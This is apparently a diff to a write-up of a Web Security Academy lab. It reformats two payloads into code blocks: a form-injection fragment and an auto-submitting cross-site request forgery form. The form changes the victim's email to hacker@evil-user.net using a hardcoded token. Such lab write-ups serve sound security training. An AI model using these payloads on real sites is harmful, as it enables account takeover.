@@ -41,9 +41,9 @@
 
 ## Payloads Used:
 
-<!--
+```html
 
-----------Payload 1----------
+<!----------Payload 1---------->
 
 "></form>
 <form
@@ -54,32 +54,31 @@
 >
   <button class="button" type="submit">Click</button
 
--->
+```
 
-<!--
-
-----------Payload 2----------
+```html
+<!----------Payload 2---------->
 
 <html>
   <body>
     <form
       action="https://0a7c00c804525f5180a7034800a300c4.web-security-academy.net/my-account/change-email"
-      method="post"
-    >
-      <input type="hidden" name="email" value="hacker@evil-user.net" />
+      method="post">
+      <input
+        type="hidden"
+        name="email"
+        value="hacker@evil-user.net" />
       <input
         type="hidden"
         name="csrf"
-        value="tqjq7kVoT9KYE0ovK4FNYfFTpnJ4srVp"
-      />
+        value="tqjq7kVoT9KYE0ovK4FNYfFTpnJ4srVp" />
     </form>
   </body>
   <script>
     document.forms[0].submit();
   </script>
 </html>
-
--->
+```
 
 ## Issues Encountered:
 
